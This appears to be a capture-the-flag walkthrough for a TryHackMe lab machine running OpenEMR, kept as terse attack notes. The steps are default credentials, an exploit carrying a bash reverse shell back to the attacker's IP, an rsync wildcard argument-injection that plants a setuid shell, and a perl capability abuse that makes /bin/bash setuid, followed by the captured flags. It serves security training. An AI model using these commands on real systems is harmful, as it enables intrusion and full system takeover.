# Plotted_emr 

> VOiD | Saturday 19 February 2022 07:45:54 PM UTC

My IP : 10.8.253.221
Target IP : 

Tip: Enumeration is key!

## PORT 21 [ftp]
```bash
cat you_are_determined.txt
Wait..I'll give you a hint: see if you can access the `admin` account

```

## PORT 80 [http - Apache]
```bash
http://10.10.158.49/admin
dGhpcyBtaWdodCBiZSBhIHVzZXJuYW1l --> this might be a username


http://10.10.158.49/shadow 		--> rick roll
```

## PORT 8890 [http - Apache]
```bash
/admin.php

create new site

connect it to sqlserver

setting up new site 
admin:Password12

python exploit.py  -u admin -p Password12 -c 'bash -i >& /dev/tcp/10.8.253.221/4444 0>&1' http://10.10.214.24:8890/portal
```

## PORT 5900 [mysql]
```bash
mysql -h 10.10.214.24 -u admin -P 5900

CREATE DATABASE openemr;
CREATE USER 'openemr'@'%' IDENTIFIED BY 'Password12';
GRANT ALL PRIVILEGES ON openemr.* TO 'openemr'@'%';
FLUSH PRIVILEGES;
```

## USER [www-data]
```bash
* * 	* * * 	plot_admin cd /var/www/html/portal/config && rsync -t * plot_admin@127.0.0.1:~/backup

cd /var/www/html/portal/config
echo "cp /bin/bash /home/plot_admin/pa_shell; chmod +xs /home/plot_admin/pa_shell" > shell.sh
chmod +x shell.sh
touch -- "-e sh shell.sh"
/home/plot_admin/pa_shell.sh -p

plot_admin@plotted:/var/www$ cat ThisFileIsInteresting 
Flag1 : THM{EMR_PWn3d_CV3}

pa_shell-5.0$ cat user.txt 
1aea32fbd5b592af1267d65dbcc3e212

getcap -r / 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/perl = cap_fowner+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/perl5.30.0 = cap_fowner+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/snap/core20/1328/usr/bin/ping = cap_net_raw+ep
/snap/core20/1169/usr/bin/ping = cap_net_raw+ep



/usr/bin/perl -e 'chmod 04777, "/bin/bash";'
/bin/bash -p 

bash-5.0# cat root.txt 
Congratulations on completing this room!

827a0e697e1567f08022ba72106ace99

Hope you enjoyed the journey!

Do let me know if you have any ideas/suggestions for future rooms
-sa.infinity8888
```